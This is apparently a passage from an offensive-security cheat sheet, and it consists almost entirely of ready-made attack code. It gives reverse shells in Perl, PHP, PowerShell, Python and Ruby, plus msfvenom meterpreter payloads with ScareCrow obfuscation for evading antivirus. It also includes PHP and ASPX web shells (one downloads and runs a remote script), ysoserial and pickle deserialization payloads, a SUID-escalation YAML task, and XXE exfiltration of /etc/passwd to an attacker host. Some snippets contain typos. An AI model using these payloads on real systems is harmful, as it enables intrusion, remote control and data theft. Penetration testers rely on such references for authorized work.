<pre><code class="language-c">perl -e 'use Socket;$i=&quot;&lt;LHOST&gt;&quot;;$p=&lt;LPORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
</code></pre>
<h5>PHP Reverse Shell</h5>
<pre><code class="language-c">php -r '$sock=fsockopen(&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
</code></pre>
<h5>PowerShell Reverse Shell</h5>
<pre><code class="language-c">$client = New-Object System.Net.Sockets.TCPClient('&lt;LHOST&gt;',&lt;LPORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex &quot;. { $data } 2&gt;&amp;1&quot; | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
</code></pre>
<pre><code class="language-c">powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('&lt;LHOST&gt;',&lt;LPORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
</code></pre>
<pre><code class="language-c">powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient(&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
</code></pre>
<h5>minireverse.ps1</h5>
<pre><code class="language-c">$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = &quot;&quot;
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace(&quot;`r`n&quot;,&quot;&quot;).Replace(&quot;`n&quot;,&quot;&quot;);
	if(!$out.equals(&quot;exit&quot;)){
		$args = &quot;&quot;;
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = &quot;cmd.exe&quot;
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = &quot;/c $out $args&quot;
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&amp;&quot;$out&quot; &quot;$args&quot;) | out-string;
			}
		}
		else{
			$res = (&amp;&quot;$out&quot;) | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals(&quot;exit&quot;))
$writer.close();
$socket.close();
$stream.Dispose()
</code></pre>
<h5>Python Reverse Shell</h5>
<pre><code class="language-c">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre>
<pre><code class="language-c">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre>
<pre><code class="language-c">python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen([&quot;/bin/su&quot;,&quot;-c&quot;,&quot;id&quot;,&quot;bynarr&quot;],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,&quot;fruity\n&quot;);time.sleep(0.1);print os.read(master,1024);'
</code></pre>
<pre><code class="language-c">echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &gt; &lt;FILE&gt;&lt;(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &gt; &lt;FILE&gt;
</code></pre>
<h5>Ruby Reverse Shell</h5>
<pre><code class="language-c">ruby -rsocket -e'f=TCPSocket.open(&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
</code></pre>
<h4>ScareCrow</h4>
<h5>Payloads</h5>
<h6>Shellcode Payload Creation with msfvenom</h6>
<pre><code class="language-c">msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=&lt;LHOST&gt; LPORT=8443 -f raw -o &lt;FILE&gt;.bin
</code></pre>
<h6>.msi-File Payload Creation with msfvenom</h6>
<pre><code class="language-c">msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=&lt;LHOST&gt; LPORT=8443 -f exe -o &lt;FILE&gt;.exe
</code></pre>
<h5>Listener</h5>
<pre><code class="language-c">msf6 &gt; use exploit/multi/handler
msf6 &gt; set payload windows/x64/meterpreter/reverse_https
</code></pre>
<h5>Obfuscation</h5>
<h6>DLL Side-Loading</h6>
<pre><code class="language-c">ScareCrow -I &lt;FILE&gt;.bin -Loader dll -domain &lt;FAKE_DOMAIN&gt;
</code></pre>
<h6>Windows Script Host</h6>
<pre><code class="language-c">ScareCrow -I &lt;FILE&gt;.bin -Loader msiexec -domain &lt;FAKE_DOMAIN&gt; -O payload.js
</code></pre>
<h6>Control Panel Files</h6>
<pre><code class="language-c">ScareCrow -I &lt;FILE&gt;.bin -Loader control -domain &lt;FAKE_DOMAIN&gt;
</code></pre>
<h5>Renaming Payload</h5>
<pre><code class="language-c">mv &lt;FILE&gt;.dll &lt;FILE&gt;32.dll
</code></pre>
<h5>Execution</h5>
<pre><code class="language-c">rundll32.exe .\&lt;FILE&gt;32.dll,DllRegisterServer
</code></pre>
<p>or</p>
<pre><code class="language-c">regsvr32 /s .\&lt;FILE&gt;32.dll
</code></pre>
<p>For <code>.cpl-Files</code> a simple double click is enough to execute them.</p>
<h4>Shikata Ga Nai</h4>
<pre><code class="language-c">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f c -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
</code></pre>
<h4>Web Shells</h4>
<h5>PHP Web Shell</h5>
<pre><code class="language-c">&lt;?php system($_GET['cmd']); ?&gt;
&lt;?php echo exec($_POST['cmd']); ?&gt;
&lt;?php echo passthru($_GET['cmd']); ?&gt;
&lt;?php passthru($_REQUEST['cmd']); ?&gt;
&lt;?php echo system($_REQUEST['shell']): ?&gt;
</code></pre>
<h4>ysoserial</h4>
<pre><code class="language-c">java -jar ysoserial-master-SNAPSHOT.jar
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc &lt;LHOST&gt; &lt;LPORT&gt; -e /bin/sh' | base64 -w 0
java -jar ysoserial.jar Groovy1 calc.exe &gt; groovypayload.bin
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 &quot;$jex&quot; &gt; /tmp/$filename.session
</code></pre>
<h3>Templates</h3>
<h4>ASPX Web Shell</h4>
<pre><code class="language-c">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;configuration&gt;
   &lt;system.webServer&gt;
      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;
      &lt;/handlers&gt;
      &lt;security&gt;
         &lt;requestFiltering&gt;
            &lt;fileExtensions&gt;
               &lt;remove fileExtension=&quot;.config&quot; /&gt;
            &lt;/fileExtensions&gt;
            &lt;hiddenSegments&gt;
               &lt;remove segment=&quot;web.config&quot; /&gt;
            &lt;/hiddenSegments&gt;
         &lt;/requestFiltering&gt;
      &lt;/security&gt;
   &lt;/system.webServer&gt;
&lt;/configuration&gt;
&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
&lt;%
Set s = CreateObject(&quot;WScript.Shell&quot;)
Set cmd = s.Exec(&quot;cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://&lt;LHOST&gt;/shellyjelly.ps1')&quot;)
o = cmd.StdOut.Readall()
Response.write(o)
%&gt;
--&gt;
</code></pre>
<h4>Bad YAML</h4>
<pre><code class="language-c">- hosts: localhost
  tasks:
    - name: badyml
      command: chmod +s /bin/bash
</code></pre>
<h4>Exploit Skeleton Python Script</h4>
<pre><code class="language-c">#!/usr/bin/python

import socket,sys

address = '127.0.0.1'
port = 9999
buffer = #TBD

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
</code></pre>
<h4>JSON POST Request</h4>
<pre><code class="language-c">POST /&lt;path&gt; HTTP/1.1
Host: &lt;RHOST&gt;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 95
Connection: close

{
  &quot;auth&quot;:{
    &quot;name&quot;:&quot;&lt;USERNAME&gt;&quot;,
    &quot;password&quot;:&quot;&lt;PASSWORD&gt;&quot;
  },
  &quot;filename&quot;:&quot;&lt;FILE&gt;&quot;
}
</code></pre>
<h4>Python Pickle RCE</h4>
<pre><code class="language-python">import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | netcat &lt;LHOST&gt; &lt;LHOST&gt; &gt; /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
</code></pre>
<pre><code class="language-python">import base64
import pickle
import os

class RCE:
	def __reduce__(self):
		cmd = (&quot;/bin/bash -c 'exec bash -i &amp;&gt;/dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; &lt;&amp;1'&quot;)
		return = os.system, (cmd, )

if __name__ == '__main__':
	pickle = pickle.dumps(RCE())
	print(bas64.b64encode(pickled))
</code></pre>
<h4>Python Redirect for SSRF</h4>
<pre><code class="language-python">#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer((&quot;0.0.0.0&quot;, 80), Redirect).serve_forever()
</code></pre>
<pre><code class="language-c">sudo python3 redirect.py http://127.0.0.1:3000/
</code></pre>
<pre><code class="language-python">#!/usr/bin/env python

import SimpleHTTPServer
import SocketServer
import sys
import argparse

def redirect_handler_factory(url):
    &quot;&quot;&quot;
    returns a request handler class that redirects to supplied `url`
    &quot;&quot;&quot;
    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       def do_GET(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

       def do_POST(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

    return RedirectHandler


def main():

    parser = argparse.ArgumentParser(description='HTTP redirect server')

    parser.add_argument('--port', '-p', action=&quot;store&quot;, type=int, default=80, help='port to listen on')
    parser.add_argument('--ip', '-i', action=&quot;store&quot;, default=&quot;&quot;, help='host interface to listen on')
    parser.add_argument('redirect_url', action=&quot;store&quot;)

    myargs = parser.parse_args()

    redirect_url = myargs.redirect_url
    port = myargs.port
    host = myargs.ip

    redirectHandler = redirect_handler_factory(redirect_url)

    handler = SocketServer.TCPServer((host, port), redirectHandler)
    print(&quot;serving at port %s&quot; % port)
    handler.serve_forever()

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<h4>Python Web Request</h4>
<pre><code class="language-python">import requests
import re

http_proxy  = &quot;http://127.0.0.1:8080&quot;
proxyDict = {
              &quot;http&quot;  : http_proxy,
            }
// get a session
r = requests.get('http://')
// send request
r = requests.post('&lt;RHOST&gt;', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
</code></pre>
<h4>XML External Entity (XXE)</h4>
<h5>Request</h5>
<pre><code class="language-c">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY % &lt;NAME&gt; SYSTEM 
&quot;http://&lt;LHOST&gt;/&lt;FILE&gt;.dtd&quot;&gt;%&lt;NAME&gt;;]&gt;
&lt;root&gt;
&lt;method&gt;GET&lt;/method&gt;
&lt;uri&gt;/&lt;/uri&gt;
&lt;user&gt;
&lt;username&gt;&lt;NAME&gt;;&lt;/username&gt;
&lt;password&gt;&lt;NAME&gt;&lt;/password&gt;
&lt;/user&gt;
&lt;/root&gt;
</code></pre>
<h5>Content of <FILE>.dtd</h5>
<pre><code class="language-c">&lt;!ENTITY % file SYSTEM &quot;php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&quot;&gt;
&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://&lt;LHOST&gt;/?f=%file;'&gt;&quot;&gt;
%eval;
%exfiltrate;
</code></pre>
